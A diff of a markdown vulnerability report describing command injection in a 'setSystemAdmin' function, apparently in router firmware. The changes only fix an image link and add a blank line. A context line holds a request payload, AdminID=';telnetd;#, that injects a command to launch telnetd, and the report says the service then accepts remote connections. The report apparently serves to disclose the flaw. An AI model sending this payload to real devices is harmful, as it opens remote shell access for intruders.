@@ -12,7 +12,7 @@ A command injection vulnerability exists in the `setSystemAdmin` function of the
 
 ### Vul Details
 
-![]../main/images/2026-02-06-14-33-01-d54d4e99-47fd-4bb1-aba0-be4328dedb64.png)
+![](../main/images/2026-02-06-14-33-01-d54d4e99-47fd-4bb1-aba0-be4328dedb64.png)
 
 ![](../main/images/2026-02-06-14-33-14-d598ade2-b784-48dc-a1cf-2f5378acbbff.png)
 
@@ -49,4 +49,5 @@ ReplySuccessPage=advanced.htm&ReplyErrorPage=errradv.htm&AdminID=';telnetd;#&Use
 ![](../main/images/2026-02-06-14-40-04-image.png)
 
 The telnetd service is already running and can be connected remotely.
+
 
